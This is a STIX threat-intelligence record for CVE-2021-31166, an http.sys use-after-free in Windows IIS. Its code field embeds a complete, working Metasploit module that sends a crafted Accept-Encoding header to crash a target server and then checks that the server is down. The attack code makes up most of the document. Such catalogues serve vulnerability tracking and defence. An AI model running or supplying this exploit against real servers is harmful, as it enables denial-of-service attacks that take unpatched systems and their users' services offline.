{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--009f5859-60ee-46b2-a1b5-9083c56384e4",
    "created": "2024-08-14T16:25:28.126796Z",
    "modified": "2024-08-14T16:25:28.126801Z",
    "name": "Windows IIS HTTP Protocol Stack DOS",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166.rb",
            "external_id": "http_sys_accept_encoding_dos_cve_2021_31166.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31166"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31166"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mauricelambert/CVE-2021-31166"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/metr0/status/1392631376592076805"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows IIS HTTP Protocol Stack DOS',\n        'Description' => %q{\n          This module exploits CVE-2021-31166, a UAF bug in http.sys\n          when parsing specially crafted Accept-Encoding headers\n          that was patched by Microsoft in May 2021, on vulnerable\n          IIS servers. Successful exploitation will result in\n          the target computer BSOD'ing before subsequently rebooting.\n          Note that the target IIS server may or may not come back up,\n          this depends on the target's settings as to whether IIS\n          is configured to start on reboot.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Max',                                             # Aka @_mxms. Vulnerability discovery\n          'Stefan Blair',                                    # Aka @fzzyhd1. Vulnerability discovery\n          'Axel Souchet',                                    # Aka @0vercl0k. PoC exploit\n          'Maurice LAMBERT <mauricelambert434[at]gmail.com>' # msf module\n        ],\n        'Platform' => 'win',\n        'References' => [\n          ['CVE', '2021-31166'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-31166'],\n          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166'],\n          ['URL', 'https://twitter.com/metr0/status/1392631376592076805'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166']\n        ],\n        'DisclosureDate' => '2021-05-11',\n        'Notes' => {\n          'Stability' => [CRASH_OS_RESTARTS],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS, SCREEN_EFFECTS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new(\n          'TARGETURI', [true, 'The URI of the IIS Server.', '/']\n        )\n      ]\n    )\n  end\n\n  # This module performs a DOS attack using a simple HTTP request.\n  def run\n    print_status('Connecting to target to make sure its alive...')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, ''),\n      'method' => 'GET'\n    )\n\n    if res.nil?\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the target IIS server - no response\")\n    end\n\n    print_good('Successfully connected to target. Sending payload...')\n\n    payload =\n      \"#{Rex::Text.rand_text_alpha(5)}, #{Rex::Text.rand_text_alpha(3)}, ,\"\n\n    exploit_headers = {\n      'Accept-Encoding' => payload\n    }\n\n    begin\n      send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, ''),\n        'timeout' => 1, # short timeout -> the server should not respond\n        'method' => 'GET',\n        'headers' => exploit_headers\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET\n      print_good('Connection reset by target server or connection failed when sending the malicious payload!')\n    ensure\n      print_good('Payload was sent to the target server.')\n      print_status('Checking that the server is down...')\n    end\n\n    begin\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, ''),\n        'method' => 'GET'\n      )\n\n      if res.nil?\n        print_good('Target is down.')\n      else\n        print_error('Target appears to still be alive. It may have not received the packet due to network filtering, or it may not be vulnerable.')\n      end\n    rescue Rex::ConnectionError, Errno::ECONNRESET\n      print_good('Target is down.')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-05-11",
    "x_mitre_platforms": [
        "win'"
    ]
}